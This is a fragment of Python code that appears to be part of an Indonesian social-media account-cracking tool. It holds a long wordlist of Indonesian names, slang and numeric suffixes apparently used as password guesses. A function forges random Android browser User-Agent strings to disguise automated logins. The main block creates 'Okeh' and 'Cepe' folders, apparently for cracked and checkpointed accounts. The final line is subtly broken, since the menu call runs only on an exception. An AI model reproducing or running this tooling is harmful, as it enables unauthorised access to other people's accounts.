'permata','permatasari','purnama','purnamasari','puspa','putri','puteri','pitri','pratiwi','pramita','priska','prisilia','qaila','qasimah','qila','qiqi','rana','rafa','raisa','rahma','rahmah','rahmawati','rahmawaty','rhma','rahnadani','rahmadhani','ramadani','ramadhani','rani','rany','rasya','rati','rara','rere','refa','repa','reva','repani','revani','rena','renatri','reni','renata','rani','ratna','rina','rida','rifda','rifdah','rini','ririn','rianti','rianty','riyanti','riyanty','riska','rizka','rohma','rohmah','rohmawati','rohmawaty','rosdiana','rosdiani','ross','rossa','rosita','rosalina','rosmanah','rum','rumaidah','ruwaidah','ryzka','sahara','saleha','salimah','sabrina','safa','saffa','safna','safira','saidah','sahira','sakila','sakinah','sakira','salma','salsa','salsabila','salsabyla','salwa','santi','sani','santy','santika','sara','shafira','shavira','shakira','shafna','shaleha','shalehah','shakeera','shakila','shalihah','shanti','shanty','shantika','shani','shaniyah','shofy','shofiyah','shofiyyah','sholeha','sholehah','sifa','silawati','sipa','silpi','silvi','siska','sinta','suci','selly','safitri','saputri','sarah','saras','sarasvati','saraswati','sari','sasmita','setiawati','sisil','siti','sity','siregar','simanjuntak','soleha','solehah','sonia','shonia','soraya','sukma','suci','sumi','sumiyati','suratni','surtini','suratmi','sasanti','susanty','susi','susilawati','susilawaty','susy','sutari','suteni','susu','syafaa','syakila','syakira','syifa','sypa','sya','syahla','syahira','syafira','syavira','tabita','tabhita','talia','taliah','talita','talitha','tami','tamimah','tammy','tania','taniya','tari','tarisa','tasya','taskia','taskiya','tazkia','tazkiya','tesa','tea','thea','thiara','tia','tias','tiastuti','tiara','tifani','tifany','tika','tina','tita','titian','titie','titin','tri','triani','tsunade','tsusilawati','tuti','tya','tiktok','tikotok','uci','uchi','ulfa','ulan','ulandari','ulandary','ulia','uliya','ulya','ulpah','ulpa','ulva','umayah','umi','umy','umiyah','umiati','umiaty','umiyati','utami','utari','ute','ubaidah','umaira','umairah','usna','usnah','uswah','uswatun','uswatunhasanah','uzwatun','vani','vany','vanya','valen','valentina','vanesa','vera','victoria','viktoria','via','vina','vivi','vivie','vianita','viola','veronica','veronika','viani','vianika','viana','viera','valencia','valensia','vita','vitaloka','vilmei','vega','viona','visi','wafa','wafda','wahdah','wardani','wardhani','wahdaniyah','wahidah','wanda','wangi','wardah','wastiqah','wati','watiah','watilah','watiyah','watsiqah','wasikoh','welas','wening','widi','widia','widhia','widhiya','widiya','widiasari','widiawati','widy','wikayah','wilona','windi','windiawati','windiasari','wina','wini','wiqayah','wikoyah','wiwin','windy','wulan','wulandari','xyz','xyzz','tzy','tyz','mojang','gemoy','imut','kebi','tembem','tete','gelis','geulis','ytta','kasep','ganteng','wibu','gojo','gojosatoru','santik','gerengseng','bokep','ewe','xtc','brigez','01','02','03','04','05','06','07','08','09','010','001','002','003','004','005','006','007','008','009','0010','00','000','0000','12345','123456','yani','yanti','yanto','yanty','yasira','yeni','yuli','yulia','yuliya','yulya','yulianti','yuliyanti','yuni','yunita','yuningsih','yuyu','yuyun','zahra','zafira','zahira','zahiyah','zahra','zahrani','zahrany','zahwa','zainab','zakiah','zaqiyah','zenab','zalfa','zalpa','zalva','zaskia','zaskiya','zaskiani','zaskiyani','zizah','zenia','zera','zhafira','zhafirah','zharifa','zharifah','zia','zizi','zyzy','zubaidah','zuhrah','zulfa','zulpa','zulva','zunaira','zunea'])

def UA(self):
	rr = random.randint; rc = random.choice
	merek =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
	redmi11 = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
	oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
	redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
	infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
	samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
	return f"Mozilla/5.0 (Linux; Android {str(rr(6,9))}; {str(rc(merek))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,60))}.0.{str(rr(111,9999))}.{str(rr(10,141))} Mobile Safari/537.36"
			
		
if __name__=='__main__':
	try: os.mkdir('Okeh')
	except: pass
	try: os.mkdir('Cepe')
	except: pass; Main_Menu()